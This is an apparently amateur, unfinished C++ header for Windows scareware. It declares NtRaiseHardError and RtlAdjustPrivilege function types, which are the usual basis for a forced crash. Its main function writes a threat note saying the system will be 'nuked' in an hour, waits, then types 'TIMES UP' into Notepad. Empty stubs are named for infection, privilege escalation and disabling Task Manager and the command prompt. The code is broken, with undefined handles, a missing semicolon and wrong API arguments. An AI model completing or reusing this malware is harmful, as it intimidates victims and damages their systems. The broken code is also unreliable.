#pragma once
#include <windows.h>
#include <cstdio>
#include <stdlib.h>
#include <time.h>
#include <filesystem>

typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

void lol()
{

        int x;
        int y;
        int duration = 3600000;
        char message[] = "you've been hacked by qv4t7 clan, we will nuke your system in 1 hour you must press D inorder to pay the and you have 1 hour to finish the game or else we'll brick your system";
        ShellExecute(NULL, NULL, L"echo %c > README.txt", NULL, NULL, SW_HIDE, message);
        if(GetAsyncKeyState(VK_D) & 0x8000)
        {
                
        }

        Sleep(duration);
        ShellExecute(NULL, NULL, L"notepad", NULL, NULL, SW_SHOW);
        SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
        Sleep(60);
        SendMessage(edit, WM_CHAR, (TCHAR)'I', 0);
        Sleep(60);
        SendMessage(edit, WM_CHAR, (TCHAR)'M', 0);
        Sleep(60);
        SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
        Sleep(60);
        SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
        Sleep(60);
        SendMessage(edit, WM_CHAR, (TCHAR)' ', 0);
        Sleep(60);
        SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
        Sleep(60);
        SendMessage(edit, WM_CHAR, (TCHAR)'P', 0);
        Sleep(600) 
        MessageBox(NULL, "yer done BOIII", "yer done boi", MB_ICONEXCLAMATION | MB_OK);
        escalateprivileges();
        ok();
        
}

void infect()
{
        // Work in progress
}

void escalateprivileges()
{
        // Work in progress
}



void disable_cmdpromt()
{
        // Work in progress
}

void disable_taskmgr()
{
        // Work in progress
}

void game_init()
{

}
